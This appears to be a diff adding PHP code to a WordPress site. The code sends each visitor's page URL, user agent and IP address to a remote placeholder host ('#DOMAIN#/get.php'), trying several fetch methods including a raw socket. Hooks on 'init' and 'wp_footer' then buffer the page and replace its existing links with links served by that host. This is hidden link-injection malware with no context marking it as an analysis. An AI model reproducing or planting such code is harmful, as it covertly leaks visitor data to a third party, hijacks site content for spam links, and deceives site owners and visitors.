@@ -1,0 +1,45 @@
+function wpgtLnkz64() {
+$url = '#DOMAIN#/get.php?pageurl='.
+urlencode('http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']).
+"&ch=utf8&useragent=".urlencode($_SERVER['HTTP_USER_AGENT']).
+"&ip=".urlencode($_SERVER['REMOTE_ADDR']);
+$LNKS=''; $churl=parse_url($url);
+if(@function_exists('curl_init')){
+$ch=curl_init();
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_URL, $url);
+$data=curl_exec($ch);
+curl_close($ch);
+return $data;
+}elseif(@function_exists('file_get_contents')){
+return file_get_contents($url);
+}elseif(ini_get("allow_url_fopen")==1){
+$hndl=fopen($url, "r");
+while(!feof($hndl)){$LNKS.=fread($hndl, 8192);}
+return $LNKS;
+}elseif($sock=fsockopen($churl['host'], 8080)){
+fputs($sock, "GET ".$url." HTTP/1.0\r\n".
+"Host: {$churl['host']}\r\n".
+"Accept: */*\r\n".
+"Keep-Alive: 300\r\n".
+"Connection: keep-alive\r\n".
+"Referer: http://{$churl['host']}\r\n\r\n");
+while ($line=fread($sock, 4096)) 
+{$response.=$line;} fclose($sock);
+$pos=strpos($response, "\r\n\r\n");
+$response=substr($response, $pos+4);
+return $response;
+}else{return '';} }
+add_action('init','buffwp64'); 
+add_action('wp_footer','buffend64');
+function buffwp64(){ob_start("wplnksfil");}
+function buffend64(){ ob_end_flush(); }
+function wplnksfil($buffer){ $links = wpgtLnkz64();
+$lnArr = explode('</a>', strip_tags($links,'<a>'));
+array_pop($lnArr);
+preg_match_all("~<a.*?href=[^>]*?>(.*?)</a>~si", $buffer, $m);
+$serA = round((count($m[0])-1)/2); $fArray = array_slice($m[0], $serA);
+$lArray = array_slice($m[0], 0, $serA-1); $rArray = array_merge ($fArray,$lArray);
+foreach($lnArr as $ln){ $buffer = str_replace(current($rArray), $ln.'</a>', $buffer);
+next($rArray);} return $buffer; }
